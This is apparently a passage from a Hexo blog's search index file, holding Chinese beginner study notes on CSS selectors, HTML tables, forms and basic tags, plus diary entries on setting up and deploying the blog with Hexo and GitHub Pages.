initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        *&#123;            margin:0;      #外边距为0            padding:0;     #内边距为0        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;1111111111&lt;/div&gt;    &lt;div id=&quot;box1&quot;&gt;2222222222&lt;/div&gt;    &lt;div id=&quot;box2&quot;&gt;3333333333&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;语法：*&#123;属性:属性值;&#125; 说明：通配选择符的写法是“*”，其含义就是所有元素。 *&#123;margin:0;padding:0;&#125;代表清除所有元素的默认边距值和填充值</code></pre><p>4.群组与后代选择器</p><pre><code>    &lt;style&gt;        标签们或者class内的类名们&#123;background-color:yellow&#125;      #标签们之间要加逗号，而且类名前要加.    &lt;/style&gt;若之间不加逗号则是后代选择器，仅更改空格代表的后代#从右到左地选择</code></pre><p>5.伪类选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        a:link&#123;color:yellow;&#125;        a:visited&#123;color:red;&#125;        a:hover&#123;color:orange;&#125;        a:active&#123;color:blue;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;超链接&quot;&gt;        内容    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;语法： a：link&#123;属性：属性值;&#125;超链接的初始状态 a.visited(属性：属性值;&#125;超链接被访问后的状态 a:hovert&#123;属性：属性值;&#125;鼠标悬停的状态 a:active&#123;属性：属性值;&#125;超链接被激活时的状态说明： A）顺序为： a:link,a:visited,a:hover,a:active,错误的顺序有时会使超链接的样式失效 B）为了简化代码，可以把伪类选择符中相同的声明提出来放在a选择符中； 例如：a&#123;color:red;&#125;a:hover&#123;color:green;&#125;表示超链接的初始和访问过后的状态一样，鼠标划过的状态和点击时的状态一样。</code></pre><p>6.选择器的权重<br>!important&gt;内联样式&gt;包含选择符&gt;id选择器&gt;class选择器&gt;类型（元素）选择器<br>有冲突时高权重覆盖低权重<br>相同权重就近原则（哪个先被定义）</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>渔夫出海前，并不知道鱼在哪里。可他们还是选择了出发，因为他们相信，自己一定会满载而归。人生很多时候，是因为选择了才有机会，相信了才有可能。————稻盛和夫</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML基础（2）</title>
      <link href="/2022/10/07/b-3/"/>
      <url>/2022/10/07/b-3/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;table border=&quot;1&quot; width=&quot;500px&quot;               &lt;!-- 创建表格 --&gt;    align=&quot;center&quot;    bordercolor=&quot;red&quot;    bgcolor=&quot;yellow&quot;    cellspacing=&quot;20&quot;    cellpadding=&quot;100&quot;&gt;                            &lt;!-- 可以选择换不换行，但是&gt;要放在最后 --&gt;        &lt;tr&gt;                                      &lt;!-- tr是行 --&gt;            &lt;td&gt;内容&lt;/td&gt;                         &lt;!-- td是单元格 --&gt;        &lt;/tr&gt;        &lt;tr bgcolor=&quot;orange&quot; height=&quot;100&quot; align=&quot;center&quot; valign=&quot;bottom&quot;&gt;            &lt;td bgcolor=&quot;red&quot; align=&quot;right&quot; valign=&quot;top&quot;&gt;内容&lt;/td&gt;        &lt;/tr&gt;    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;表格table属性 1. 宽度 width            （可以写成百分比————父元素的百分比）2. 高度 height           （只能写像素px）3. 边框 border 4. 边框颜色 bordercolor 5. 背景颜色 bgcolor 6. 水平对齐 align=&quot;left&quot;或right或center 7. cellspacing=&quot;单元格与单元格之间的间距 8. cellpadding=&quot;单元格与内容之间的空隙行tr属性 1. 高度 height 2. 背景颜色 色bgcolor 3. 文字水平对齐 align=“left或right或center” 4. 文字垂直对齐 子valign=“top或middle或bottom&quot;单元格td属性（table data）1. 宽度 width （影响一列）2. 高度 height （影响一行）3. 背景颜色 bgcolor 4. 文字水平对齐 align=“left或right或center” 5. 文字垂直对齐 valign=“top或middle或bottom表格合并colspan=&quot;要合并的列数&quot;rowspan=&quot;要合并的行数&quot;注意不能合并成T型，合并之后要把被占的元素删除（注释掉）</code></pre><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><pre><code>&lt;body&gt;    &lt;form action=&quot;地址&quot; method=&quot;POST&quot;&gt;                                                     &lt;!-- POST是不显示在url的，GET会暴露 --&gt;        内容：&lt;input type=&quot;text&quot; placeholder=&quot;提示信息，输入内容后会消失&quot; name=&quot;内容&quot;&gt;        &lt;!-- 输入的完全显示 --&gt;        内容：&lt;input type=&quot;password&quot; placeholder=&quot;提示信息，输入内容后会消失&quot; name=&quot;内容&quot;&gt;    &lt;!-- 输入的显示为一个点 --&gt;        &lt;input type=&quot;submit&quot; value=&quot;按钮上的内容&quot; &gt;                                         &lt;!-- 提交信息到action指定的地址 --&gt;           &lt;input type=&quot;reset&quot; value=&quot;按钮上的内容&quot; &gt;                                          &lt;!-- 清除全部表单内容 --&gt;        &lt;input type=&quot;button&quot; value=&quot;按钮上的内容&quot; &gt;                                         &lt;!-- 自定义按钮 --&gt;    &lt;/form&gt;&lt;/body&gt;***不设置name就不能发送***typr=&quot;submit&quot;相当于&lt;button&gt;内容&lt;/button&gt;Form当中method的post和get的区别？ 1.get是从服务器上获取数据，post是向服务器传送数据。 2.get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段——对应，在URL中可以看到。  post 是通过HTTPpost机制，将表单内各个字段与其内容放置在HTMLHEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。 3.对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。 4.get传送的数据量较小。post传送的数据量较大，一般为不受限制。</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>生活，在喜怒哀乐间走走停停 不知道会遇见什么，只知道阳光这么好，别辜负了今天，早安！</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML基础（1）</title>
      <link href="/2022/10/06/b-4/"/>
      <url>/2022/10/06/b-4/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="1-什么是HTML"><a href="#1-什么是HTML" class="headerlink" title="1.什么是HTML"></a>1.什么是HTML</h3><p>是扩展名，超文本标记语言(Hyper Text Markup Language)<br>不是编程语言而是由标签组成的标记语言</p><h3 id="2-兼容性"><a href="#2-兼容性" class="headerlink" title="2.兼容性"></a>2.兼容性</h3><p>查询网站<br>不同浏览器兼容性不一样，因此需要Web标准的制定<br>W3C万维网联盟</p><h3 id="3-WEB组成部分"><a href="#3-WEB组成部分" class="headerlink" title="3.WEB组成部分"></a>3.WEB组成部分</h3><p>HTML:结构，由W3C制定标准和语法<br>CSS:样式布局<br>JS:触发行为</p><h3 id="4-HTML基本语法"><a href="#4-HTML基本语法" class="headerlink" title="4.HTML基本语法"></a>4.HTML基本语法</h3><p>(1)常规标记/双标记<br>&lt;标记 属性=”属性值”&gt;<br>&lt;/。。。&gt;<br>(2)空标记/单标记<br>&lt;标记 属性=”属性值”/&gt;</p><h3 id="5-基本结构"><a href="#5-基本结构" class="headerlink" title="5.基本结构"></a>5.基本结构</h3><pre><code>&lt;!DOCTYPE html 5&gt;                     #文档说明标签（格式说明使用html5）&lt;html lang=&quot;en&quot;&gt;                      #语言zh-CN/ja-jp/en（对网址翻译）&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;              #编码ASCII/ISO-8859-1/GB2312/UTF-8  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="6-开发工具"><a href="#6-开发工具" class="headerlink" title="6.开发工具"></a>6.开发工具</h3><p>Sublime Text，webstorm,HBuilderX,VScode<br>快捷键:选中文本alt+w添加&lt; p &gt;<br>ctrl+/注释<br>ul&gt;li{内容}*n + 回车 建立n个无序列表并加上内容<br>dl&gt;dt{内容}+dd{内容} + 回车 建立自定义列表并加上内容</p><h3 id="7-基本标签"><a href="#7-基本标签" class="headerlink" title="7.基本标签"></a>7.基本标签</h3><pre><code>(1)标题标签    &lt;h1&gt;一级标题最大&lt;/h1&gt;    &lt;h6&gt;最小六级标题&lt;/h6&gt;(2)段落文本标签    &lt;p&gt;段落文本内容&lt;/p&gt;    段与段间有间隔(3)水平线标签(同时更改颜色，长度，位置，关闭阴影)                       #注意一对标签的格式加/    &lt;hr color=&quot;green&quot; width=&quot;600&quot; align=&quot;left/right&quot; noshade&gt;(4)文本修饰标签————加粗   &lt;b&gt;普通加粗&lt;strong&gt;便于爬虫(5)文本修饰标签————倾斜   &lt;em&gt;或&lt;i&gt;(6)文本修饰标签————删除   &lt;s&gt;或&lt;del&gt;(7)文本修饰标签————下划线   &lt;u&gt;(8)文本修饰标签————上下标   &lt;sub&gt;/&lt;sup&gt;(9)划分区域，占一行（破坏结构）   &lt;div&gt;内容&lt;/div&gt;(10)独立修饰文本（不破坏结构）   &lt;span&gt;内容&lt;/span&gt;</code></pre><h3 id="8-特殊符号"><a href="#8-特殊符号" class="headerlink" title="8.特殊符号"></a>8.特殊符号</h3><pre><code>尖角号      &amp;lt;左    &amp;gt;右空格        &amp;nbsp;受字体影响    &amp;emsp;一个中文宽度版权        &amp;copy;©商标        &amp;trade; TM标签      &amp;reg; R标签</code></pre><h3 id="9-列表"><a href="#9-列表" class="headerlink" title="9.列表"></a>9.列表</h3><pre><code>(1)有序&lt;!-- li里可以随意放标签，ol里只能放li，数字1.2.3.是自动生成的 --&gt;&lt;ol type=&quot;A&quot; start=&quot;&quot;4&gt;    &lt;li&gt;                             #type只能是1，a，A，i，I    &lt;/li&gt;                     start只能取一个数字1，2，3...&lt;/ol&gt;(2)无序&lt;!-- ul里只能放li，li里随便放 --&gt;&lt;ul type=&quot;none&quot;&gt;    &lt;li&gt;                             #默认是黑色实心圆    &lt;/li&gt;                     type只能填disc，circle，square，none（取消）&lt;/ul&gt;(3)自定义&lt;dl&gt;    &lt;dt&gt;文字或图&lt;/dt&gt;         #只复制&lt;dd&gt;&lt;dt&gt;是贴在一起的    &lt;dd&gt;相关文字&lt;/dd&gt;          复制&lt;dl&gt;则间隔一行&lt;/dl&gt;</code></pre><h3 id="10-图片"><a href="#10-图片" class="headerlink" title="10.图片"></a>10.图片</h3><h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><pre><code>&lt;img src=&quot;XXX&quot;&gt;(1)绝对路径（本地有此文件）    直接填地址(2)相对路径    与html文件在同级目录下写             名字.gif  或者  ./名字.gif    图片在下级则直接写地址    图片在上级则先../返回上一级再接着写地址(每一个../都是一次返回上级)#此处要注意：不同操作系统使用的斜杠不同（Linux系统是/  window系统都可以）# 属性&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;(1)alt=（你告诉它要显示的）图片加载失败时的提示信息&quot;(2)title=标题（指针放上去后显示的）(3)width=&quot;200px&quot; height=&quot;200px&quot;更改宽高         #px是像数值，只设置一个时会自动缩放</code></pre><h3 id="11-超链接-a链接"><a href="#11-超链接-a链接" class="headerlink" title="11.超链接(a链接)"></a>11.超链接(a链接)</h3><pre><code>&lt;a herf=&quot;链接&quot; title=&quot;鼠标悬停显示的信息&quot; target=&quot;在何处打开文档&quot;&gt;超链接放置的内容&lt;/a&gt;  (1)target=&quot;_self&quot;      在默认值(2)target=&quot;_blank&quot;     在新窗口打开(3)超链接赋予图片:&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;https://www.baidu.com&quot; title=&quot;百度查询&quot;&gt;        &lt;img src=&quot;图片地址&quot; alt=&quot;&quot;&gt;                          将图片包在超链接中    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>只要你仍然担忧别人对你的看法，你就会受制于他们。唯有当你无须外界的认可时，你才能拥有你自己。————尼尔-唐纳德-沃尔什</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML基础（1）</title>
      <link href="/2022/10/06/b-5/"/>
      <url>/2022/10/06/b-5/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="1-什么是HTML"><a href="#1-什么是HTML" class="headerlink" title="1.什么是HTML"></a>1.什么是HTML</h3><p>是扩展名，超文本标记语言(Hyper Text Markup Language)<br>不是编程语言而是由标签组成的标记语言</p><h3 id="2-兼容性"><a href="#2-兼容性" class="headerlink" title="2.兼容性"></a>2.兼容性</h3><p>查询网站<br>不同浏览器兼容性不一样，因此需要Web标准的制定<br>W3C万维网联盟</p><h3 id="3-WEB组成部分"><a href="#3-WEB组成部分" class="headerlink" title="3.WEB组成部分"></a>3.WEB组成部分</h3><p>HTML:结构，由W3C制定标准和语法<br>CSS:样式布局<br>JS:触发行为</p><h3 id="4-HTML基本语法"><a href="#4-HTML基本语法" class="headerlink" title="4.HTML基本语法"></a>4.HTML基本语法</h3><p>(1)常规标记/双标记<br>&lt;标记 属性=”属性值”&gt;<br>&lt;/。。。&gt;<br>(2)空标记/单标记<br>&lt;标记 属性=”属性值”/&gt;</p><h3 id="5-基本结构"><a href="#5-基本结构" class="headerlink" title="5.基本结构"></a>5.基本结构</h3><pre><code>&lt;!DOCTYPE html 5&gt;                     #文档说明标签（格式说明使用html5）&lt;html lang=&quot;en&quot;&gt;                      #语言zh-CN/ja-jp/en（对网址翻译）&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;              #编码ASCII/ISO-8859-1/GB2312/UTF-8  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="6-开发工具"><a href="#6-开发工具" class="headerlink" title="6.开发工具"></a>6.开发工具</h3><p>Sublime Text，webstorm,HBuilderX,VScode<br>快捷键:选中文本alt+w添加&lt; p &gt;<br>ctrl+/注释<br>ul&gt;li{内容}*n + 回车 建立n个无序列表并加上内容<br>dl&gt;dt{内容}+dd{内容} + 回车 建立自定义列表并加上内容</p><h3 id="7-基本标签"><a href="#7-基本标签" class="headerlink" title="7.基本标签"></a>7.基本标签</h3><pre><code>(1)标题标签    &lt;h1&gt;一级标题最大&lt;/h1&gt;    &lt;h6&gt;最小六级标题&lt;/h6&gt;(2)段落文本标签    &lt;p&gt;段落文本内容&lt;/p&gt;    段与段间有间隔(3)水平线标签(同时更改颜色，长度，位置，关闭阴影)                       #注意一对标签的格式加/    &lt;hr color=&quot;green&quot; width=&quot;600&quot; align=&quot;left/right&quot; noshade&gt;(4)文本修饰标签————加粗   &lt;b&gt;普通加粗&lt;strong&gt;便于爬虫(5)文本修饰标签————倾斜   &lt;em&gt;或&lt;i&gt;(6)文本修饰标签————删除   &lt;s&gt;或&lt;del&gt;(7)文本修饰标签————下划线   &lt;u&gt;(8)文本修饰标签————上下标   &lt;sub&gt;/&lt;sup&gt;(9)划分区域，占一行（破坏结构）   &lt;div&gt;内容&lt;/div&gt;(10)独立修饰文本（不破坏结构）   &lt;span&gt;内容&lt;/span&gt;</code></pre><h3 id="8-特殊符号"><a href="#8-特殊符号" class="headerlink" title="8.特殊符号"></a>8.特殊符号</h3><pre><code>尖角号      &amp;lt;左    &amp;gt;右空格        &amp;nbsp;受字体影响    &amp;emsp;一个中文宽度版权        &amp;copy;©商标        &amp;trade; TM标签      &amp;reg; R标签</code></pre><h3 id="9-列表"><a href="#9-列表" class="headerlink" title="9.列表"></a>9.列表</h3><pre><code>(1)有序&lt;!-- li里可以随意放标签，ol里只能放li，数字1.2.3.是自动生成的 --&gt;&lt;ol type=&quot;A&quot; start=&quot;&quot;4&gt;    &lt;li&gt;                             #type只能是1，a，A，i，I    &lt;/li&gt;                     start只能取一个数字1，2，3...&lt;/ol&gt;(2)无序&lt;!-- ul里只能放li，li里随便放 --&gt;&lt;ul type=&quot;none&quot;&gt;    &lt;li&gt;                             #默认是黑色实心圆    &lt;/li&gt;                     type只能填disc，circle，square，none（取消）&lt;/ul&gt;(3)自定义&lt;dl&gt;    &lt;dt&gt;文字或图&lt;/dt&gt;         #只复制&lt;dd&gt;&lt;dt&gt;是贴在一起的    &lt;dd&gt;相关文字&lt;/dd&gt;          复制&lt;dl&gt;则间隔一行&lt;/dl&gt;</code></pre><h3 id="10-图片"><a href="#10-图片" class="headerlink" title="10.图片"></a>10.图片</h3><h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><pre><code>&lt;img src=&quot;XXX&quot;&gt;(1)绝对路径（本地有此文件）    直接填地址(2)相对路径    与html文件在同级目录下写             名字.gif  或者  ./名字.gif    图片在下级则直接写地址    图片在上级则先../返回上一级再接着写地址(每一个../都是一次返回上级)#此处要注意：不同操作系统使用的斜杠不同（Linux系统是/  window系统都可以）# 属性&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;(1)alt=（你告诉它要显示的）图片加载失败时的提示信息&quot;(2)title=标题（指针放上去后显示的）(3)width=&quot;200px&quot; height=&quot;200px&quot;更改宽高         #px是像数值，只设置一个时会自动缩放</code></pre><h3 id="11-超链接-a链接"><a href="#11-超链接-a链接" class="headerlink" title="11.超链接(a链接)"></a>11.超链接(a链接)</h3><pre><code>&lt;a herf=&quot;链接&quot; title=&quot;鼠标悬停显示的信息&quot; target=&quot;在何处打开文档&quot;&gt;超链接放置的内容&lt;/a&gt;  (1)target=&quot;_self&quot;      在默认值(2)target=&quot;_blank&quot;     在新窗口打开(3)超链接赋予图片:&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;https://www.baidu.com&quot; title=&quot;百度查询&quot;&gt;        &lt;img src=&quot;图片地址&quot; alt=&quot;&quot;&gt;                          将图片包在超链接中    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>只要你仍然担忧别人对你的看法，你就会受制于他们。唯有当你无须外界的认可时，你才能拥有你自己。————尼尔-唐纳德-沃尔什</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>啥也没有</title>
      <link href="/2022/10/05/b-2/"/>
      <url>/2022/10/05/b-2/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>1.今天给blog整了个大装修<br>2.除此之外好像啥也没干</p><h3 id="每日一悟"><a href="#每日一悟" class="headerlink" title="每日一悟"></a>每日一悟</h3><p>在装修过程中发现了修改和添加模块基本上就是更改source和themes两个文件夹<br>原因在上一篇文章中已经给出了详细说明。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>无论在何种困顿中，唯有内心的自由馈赠我们真正的未来。</p><h3 id="今天就这样吧"><a href="#今天就这样吧" class="headerlink" title="今天就这样吧"></a>今天就这样吧</h3>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度了解HexoBlog</title>
      <link href="/2022/10/05/b-1/"/>
      <url>/2022/10/05/b-1/</url>
      
        <content type="html"><![CDATA[<h5 id="深入了解Hexo搭建博客的底层原理"><a href="#深入了解Hexo搭建博客的底层原理" class="headerlink" title="深入了解Hexo搭建博客的底层原理"></a>深入了解Hexo搭建博客的底层原理</h5><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在趟过无数个坑，解决了无数个报错后，终于把这个博客整出来了。<br>现在回过头来，开始对hexo原理好奇起来。</p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>优点很明显啊，主题多，文件多(利于解决各种各样天花乱坠的报错)，通过修改yaml配置文件来修改样式比较简单。<br>但是缺点一样很明显，bug是真的多(一步错步步错)，每次发布文章都需要重新部署，没有一个后台管理系统(加上GitHub的海外服务器，简直让人欲仙欲死)。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>博客hexo生成的是静态页面，而Github pages 又支持静态页面的解析。因此二者一拍即合能够用来生成 html 拼合成博客。</p><h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><p>1.Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。<br>2.文件<br>  ├── node_modules：             #依赖包-安装插件及所需nodejs模块。<br>  ├── public                     #最终网页信息。即存放被解析markdown、html文件。<br>  ├── scaffolds                  #模板文件夹。即当您新建文章时，根据 scaffold生成文件。<br>  ├── source                     #资源文件夹。即存放用户资源。<br>  └── _posts                     #博客文章目录。<br>  └── themes                     #存放主题。Hexo根据主题生成静态页面。<br>  ├── _config.yml                #网站的配置信息。标题、网站名称等。<br>  ├── db.json：                  #source解析所得到的缓存文件。<br>  ├── package.json               # 应用程序信息。即配置Hexo运行需要js包。<br>3.source就是数据库，以.md（markdown）格式存储文章，theme文件夹是主题文件（决定页面模板）。<br>4.部署流程:<br>hexo g：生成静态文件。将我们的数据和界面模板相结合生成静态文件的过程。Hexo（node.js程序）遍历主题文件中你的source目录（js、css、img等静态资源），建立索引，再根据索引生成由html、js、css、img建立的纯静态文件并放在public文件夹里。public就是你的博客了，而这些恰好能被gitpages识别。<br>hexo d：部署文件。主要是根据在_config.yml中配置的git仓库或者coding的地址，将public文件通过git方式push到上传到github或coding的指定分支，然后在根据pages服务呈现出页面。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>试验</title>
      <link href="/2022/10/04/a/"/>
      <url>/2022/10/04/a/</url>
      
        <content type="html"><![CDATA[<p><a href="http://t.csdn.cn/FwpOt">写作教程总结</a></p><h1 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h1><p>hexo server</p><h1 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h1><p>hexo new a</p><h1 id="新建草稿"><a href="#新建草稿" class="headerlink" title="新建草稿"></a>新建草稿</h1><p>hexo new draft b</p><h1 id="发布草稿成为文章"><a href="#发布草稿成为文章" class="headerlink" title="发布草稿成为文章"></a>发布草稿成为文章</h1><p>hexo publish b</p><h1 id="发布关于"><a href="#发布关于" class="headerlink" title="发布关于"></a>发布关于</h1><p>hexo new page c</p><h1 id="生成静态文章"><a href="#生成静态文章" class="headerlink" title="生成静态文章"></a>生成静态文章</h1><p>hexo generate 或者是 hexo g</p><h1 id="部署文章"><a href="#部署文章" class="headerlink" title="部署文章"></a>部署文章</h1><p>hexo deploy 或者是 hexo d</p><p>Markdowm语法:<a href="http://t.csdn.cn/BJSXy">教程</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客创建日记</title>
      <link href="/2021/09/25/b/"/>
      <url>/2021/09/25/b/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a><strong>每日一记</strong></h3><p>如何使用hexo编写blog文章<br>1.在blog本地文件夹内git bash<br>2.hexo s                                     <em>本地查看，似乎没什么用？</em><br>3.hexo new draft b                           <em>建立草稿</em><br>4.hexo publish b                             <em>发表草稿</em><br>5.hexo new page c                            <em>发布关于</em><br>6.hexo g                                     <em>生成静态文件————也就是能读</em><br>7.hexo d                                     <em>上传部署至GitHub</em><br>8.打开GitHub的个人库查看有没有绿               <em>不是我说，是真的慢！！！！！</em><br>9.打开blog刷新</p><p>如何快速上传<br>————使用DevSidecar边车辅助工具</p><h3 id="每日一悟"><a href="#每日一悟" class="headerlink" title="每日一悟"></a><strong>每日一悟</strong></h3><p>1.每次上传都是对比本地的，不要想着在GitHub里改就能偷懒！<br>2.每次写新文章都可以用上面的，但是最好在b和c后面加上日期<br>3.上传了之后发现有问题可以在本地用VSC改了再发一次<br>4.上面说的修改是指在删除D:\BLOG\hexoblog\source\。。。的同时修改D:\BLOG\hexoblog\source\的对应文件<br>5.如果出现界面信息错误就在D:\BLOG\hexoblog\themes\hexo-theme-matery\的_config这里修改<br>6.猜测要加入其他模块也是在上面那个文件里<br>7.已经尝试了两种方法仍然不能显示图片，应该只能使用图床才能解决(一年9r)<br>8.为了更好地写博客，希望大家赏一个钢镚儿</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a><strong>每日一句</strong></h3><p>知识使人自由，至少渴望自由。————特雷弗-诺亚</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
